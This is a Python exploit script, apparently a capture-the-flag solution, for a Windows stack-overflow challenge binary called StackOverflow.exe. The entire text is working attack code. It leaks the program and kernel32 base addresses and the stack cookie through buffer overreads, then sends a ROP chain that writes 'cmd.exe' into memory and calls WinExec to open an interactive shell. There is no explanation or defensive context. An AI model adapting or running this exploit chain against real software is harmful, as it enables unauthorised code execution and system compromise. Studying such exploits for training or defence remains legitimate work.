"""
    exp tested in windows 10 pro(19041.508)
    just rop to ucrtbase!system("cmd.exe") or kernel32!winexec("cmd.exe",1)
"""
from winpwn import *
ru=lambda s:p.recvuntil(s)
rl=lambda :p.recvline()
rul=lambda s:p.recvuntil(s+'\n')
sl=lambda s:p.sendline(str(s))
sd=lambda s:p.send(str(s))
rn=lambda n:p.recvn(n)

def run(ip=None,port=None):
    global p,is_debug
    if ip and port:
        is_debug=False
        p=remote(ip,port)
    elif libpath and binarypath:
        p=process(binarypath,env={'LD_PRELOAD':libpath})
    else:
        p=process(binarypath)
def debugf(s=''):
    if is_debug:
        windbgx.attach(p,s)

def exp(ip=None,port=None):
    global p
    run(ip=ip,port=port)
    ru("input:\r\n")
    sd("a"*0x118)
    ru("buffer:\r\n")
    rn(0x118)
    binbase=u64(rn(6).ljust(8,"\x00"))-0x12f4
    print(hex(binbase))
    ru("input:\r\n")
    sd("a"*0x158)
    ru("buffer:\r\n")
    rn(0x158)
    kernel32_base=u64(rn(6).ljust(8,'\x00'))-0x16fd4
    winexec=0x65fc0+kernel32_base
    p.close()

    p=process("./StackOverflow.exe")
    ru("input:\r\n")
    sd("a"*0x100)
    ru("buffer:\r\n")
    rn(0x100)

    call_rcx=kernel32_base+0x33711
    pop_rbp_ret=binbase+0x17ee
    call_puts=binbase+0x109B
    pop_rcx_ret=0x77e01+kernel32_base
    pop_rdx_ret=kernel32_base+0x24ea2
    mov_into_rdx_rcx_ret=kernel32_base+0x166af
    print(hex(binbase),hex(kernel32_base),hex(winexec),hex(pop_rcx_ret),hex(call_rcx))
    cookie=u64(rn(6).ljust(8,'\x00'))
    payload=("a"*0x100+p64(cookie)).ljust(0x110,"b")+p64(0)
    payload+=p64(pop_rdx_ret)+p64(binbase+0x3ff0)+p64(pop_rcx_ret)+"cmd.exe\x00"+p64(mov_into_rdx_rcx_ret)
    payload+=p64(pop_rcx_ret)+p64(binbase+0x3ff0)+p64(pop_rdx_ret)+p64(1)+p64(winexec)
    ru("input:\r\n")
    sd(payload)
    ru("input:\r\n")
    sd(payload)
    p.interactive()

context.log_level="debug"
context.arch="amd64"
context.aslr=True
p=None
libpath=None
binarypath=["./StackOverflow.exe"]
is_debug=True
exp()
